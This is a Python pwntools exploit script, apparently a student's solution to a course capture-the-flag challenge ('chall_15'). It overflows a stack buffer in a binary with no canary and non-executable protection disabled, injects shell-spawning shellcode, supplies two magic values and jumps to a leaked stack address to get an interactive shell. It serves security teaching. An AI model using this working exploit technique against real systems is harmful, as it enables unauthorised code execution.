'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_15
File Description:  Shellcode from NX disabled

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   69) Symbols       No    0               2               chall_15

File info:
chall_15: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=132611036b789092b3e5c7acb2673007d7afd5b3, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

Symbols:
    No win func so going to need to pop a shell
    Going to use printf or puts

Strings:
    Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans --- only string in binary

Vulns:
    Stack Canary is disabled along with NX so I smell shellcode!
    asm(shellcraft.asm)
    Set context to amd64

    # Requres two passwords to contiue
        var_4: 0xb16b00b5
        var_8: 0xdeadd00d 
        var_120: user input to smash to rip --> padding value
'''

# Import Libraries
from pwn import *

# Variables to make exit
arg1 = p32(0xdeadd00d)
arg2 = p32(0xb16b00b5)

# Craft shellcode
context.arch="amd64"   # Set to 64 bit
shell = asm(shellcraft.sh())    # Generate shell

# Determine padding
offset = 280
pad = b'a' * (offset - len(shell))      # How much to pad to leave room for the shell
print("PAD LEN: ", len(pad))
padOverRbp = b'z' * 8

# Start process and catch leak
p = process("./chall_15")
resp = p.recvuntil(b"baked beans\n")
leak = p.recvuntil(b'\n')   # Grap leak to return to use shell code
leakInt = int(leak,16)      # Turn into decimal number then feed to p64
leakAddr = p64(leakInt)
print("LEAK: ", leak)

# Craft payload
payload = shell + pad + arg1 + arg2 + padOverRbp + leakAddr
print("PAYLOAD LEN: ", len(payload))

# Send payload and be interactive
p.sendline(payload)
p.interactive()